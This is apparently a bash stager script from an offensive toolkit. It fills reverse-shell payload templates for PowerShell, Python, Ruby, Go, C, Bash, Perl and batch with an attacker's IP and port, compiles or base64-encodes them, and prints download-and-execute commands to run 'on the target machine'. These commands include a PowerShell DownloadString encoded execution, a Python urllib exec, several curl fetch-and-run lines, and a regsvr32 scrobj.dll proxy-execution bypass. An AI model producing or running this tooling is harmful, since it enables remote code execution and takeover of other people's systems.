#!/bin/bash

#---------------#---------#  
W='\033[0m'  # White   #
R='\033[0;31m' # Red     #
G='\033[0;32m' # Green   #
O='\033[0;33m' # Orange  #
B='\033[0;34m' # Blue    #
P='\033[0;35m' # Purple  #
C='\033[0;36m' # Cyan    #
M='\033[0;35m' # Magenta #
Y='\033[0;33m' # Yellow  #
#---------------#---------#

filename=$1
ip=$2
port=$3
random_filename=$(echo $RANDOM | base64 | head -c 6;echo)

payload=$(cat $filename | sed 's/{IP}/'$ip'/g' | sed 's/{PORT}/'$port'/g')
file_ext=$(echo $filename | tr '.' '\n' | tail -n 1)

echo -e $G \\n[+] $W Run the following command on the target machine:

powershell(){
	echo $payload | iconv -t UTF16LE | base64 | tr '\n' ',' | sed 's/,//g' > $random_filename"_"$ip"_"$port"_"ps.txt
	new_filename=$random_filename"_"$ip"_"$port"_"ps.txt
	echo
	mv $new_filename payloads/windows
	echo powershell -c "\"\$t=(New-Object Net.WebClient).DownloadString('http://$ip:13378/$new_filename');powershell -enc \$t\""
}

python(){
	new_filename=$random_filename"_"$ip"_"$port"_"py.txt
	cat $filename | sed 's/{IP}/'$ip'/g' | sed 's/{PORT}/'$port'/g' > $new_filename
	echo
	mv $new_filename payloads/python
	echo python -c "\"import urllib;html=urllib.urlopen('http://$ip:13378/$new_filename').read();exec(html)\""
}

ruby(){
	new_filename=$random_filename"_"$ip"_"$port"_"py.txt
	echo $payload > $random_filename"_"$ip"_"$port"_"rb.txt
	echo
	mv $new_filename payloads/ruby
	echo "curl http://$ip:13378/$new_filename --output test.rb && ruby test.rb"
}

Go(){
	new_filename=$random_filename"_"$ip"_"$port"_".go
	new_exe=$random_filename"_"$ip"_"$port.exe
	cat $filename | sed 's/{IP}/'$ip'/g' | sed 's/{PORT}/'$port'/g' > $new_filename
	if [[ "$filename" =~ windows.* ]]
	then
		bash build_windows_client.sh $new_filename $new_exe
	elif [[ "$filename" =~ linux.* ]]
	then
		bash build_linux_client.sh $new_filename $new_exe
	fi
	sleep 1
	mv "$new_exe" payloads/Go/
	echo "curl http://$ip:13378/$new_exe --output test.exe && test.exe"
}

Cpp(){
	if [[ "$filename" =~ "windows" ]]
	then
		new_filename=windows_$random_filename"_"$ip"_"$port
		cat $filename | sed 's/{IP}/'$ip'/g' | sed 's/{PORT}/'$port'/g' > $new_filename.c
		x86_64-w64-mingw32-gcc $new_filename.c -o $new_filename.exe -lws2_32
		mv $new_filename.exe payloads/C
		echo "curl http://$ip:13378/$new_filename --output test.exe && test.exe"
	elif [[ "$filename" =~ "linux" ]]
	then
		new_filename=linux_$random_filename"_"$ip"_"$port
		cat $filename | sed 's/{IP}/'$ip'/g' | sed 's/{PORT}/'$port'/g' > $new_filename.c
		gcc -o $new_filename $new_filename.c
		mv $new_filename payloads/C
		echo "curl http://$ip:13378/$new_filename --output test && test"
	rm $new_filename.c
	fi

}

Bash(){
	new_filename=$random_filename"_"$ip"_"$port"_"sh.txt
	echo $payload > $random_filename"_"$ip"_"$port"_"sh.txt
	echo
	mv "$new_filename" payloads/linux/
	echo "curl http://$ip:13378/$new_filename --output test.sh && test.exe"
}

Perl(){
	new_filename=$random_filename"_"$ip"_"$port"_"pl.txt
	echo $payload > $random_filename"_"$ip"_"$port"_"pl.txt
	echo
	sleep 1
	mv $new_filename payloads/Perl/
	echo "curl http://$ip:13378/$new_filename --output test.pl && perl test.pl"
}

Bat(){
	payload_encoded=$(cat $filename | sed 's/{IP}/'$ip'/g' | sed 's/{PORT}/'$port'/g' | base64 |  tr '\n' ',' | sed 's/,//g' )
	echo $payload_encoded
	cat payloads/windows/delivery_template.sct | sed 's/{PAYLOAD}/'$payload_encoded'/g' > $random_filename"_"$ip"_"$port"_"bat.sct
	new_filename=$random_filename"_"$ip"_"$port"_"bat.sct
	echo
	sleep 1
	mv $new_filename payloads/windows/
	echo "copy /Y %windir%\system32\scrobj.dll %TEMP%\scrubj.dll && regsvr32 /s /u /i:http://$ip:13378/$new_filename %TEMP%\scrubj.dll "
}


if [[ "$file_ext" = "ps1" ]]
then
	powershell
elif [[ "$file_ext" = "py" ]]
then
	python
elif [[ "$file_ext" = "rb" ]]
then
	ruby
elif [[ "$file_ext" = "go" ]]
then
	Go
elif [[ "$file_ext" = "c" ]]
then
	Cpp
elif [[ "$file_ext" = "sh" ]]
then
	Bash
elif [[ "$file_ext" = "pl" ]]
then
	Perl
elif [[ "$file_ext" = "bat" ]]
then
	Bat
fi
